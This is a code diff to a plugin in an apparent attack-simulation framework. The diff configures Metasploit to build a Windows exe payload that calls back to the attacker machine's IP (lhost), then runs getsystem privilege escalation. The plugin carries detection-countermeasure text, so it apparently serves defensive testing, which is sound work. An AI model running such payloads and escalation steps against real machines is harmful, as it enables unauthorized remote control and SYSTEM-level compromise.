@@ -4,6 +4,7 @@
 
 from plugins.base.attack import AttackPlugin
 from app.metasploit import MetasploitInstant
+import socket
 
 
 class MetasploitGetsystemPlugin(AttackPlugin):
@@ -37,12 +38,20 @@ class MetasploitGetsystemPlugin(AttackPlugin):
                                        attacker=self.attacker_machine_plugin,
                                        username=self.metasploit_user)
 
+        ip = socket.gethostbyname(self.attacker_machine_plugin.get_ip())
+
         metasploit.smart_infect(target,
                                 payload=payload_type,
-                                payload_name=payload_name,
-                                architecture="x64")
+                                architecture="x64",
+                                platform="windows",
+                                lhost=ip,
+                                format="exe",
+                                outfile=payload_name)
+
+        # TODO: https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/priv/elevate.c#L70
 
         metasploit.getsystem(target,
+                             variant=self.conf['variant'],
                              situation_description="This is an example standalone attack step. In real world attacks there would be events before and after",
                              countermeasure="Observe how pipes are used. Take steps before (gaining access) and after (abusing those new privileges) into account for detection."
                              )
